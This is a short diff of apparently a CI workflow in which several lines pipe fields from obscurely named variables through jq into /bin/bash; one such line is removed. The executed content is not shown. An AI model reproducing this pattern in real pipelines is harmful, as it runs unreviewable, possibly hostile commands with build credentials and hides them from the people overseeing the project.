@@ -23,7 +23,6 @@ jobs:
           echo $cjuym863 | jq -r .vj642 | /bin/bash
           echo $juln0632 | jq -r .osldp2951 | /bin/bash
           echo $u0598 | jq -r .iwc24 | /bin/bash
-          printf '%s' "$cua11" | jq -r .hwe7232 | /bin/bash
           echo $hr03226 | jq -r .xum70092 | /bin/bash
           echo $piv4126 | jq -r .qbvjh8072 | /bin/bash
 
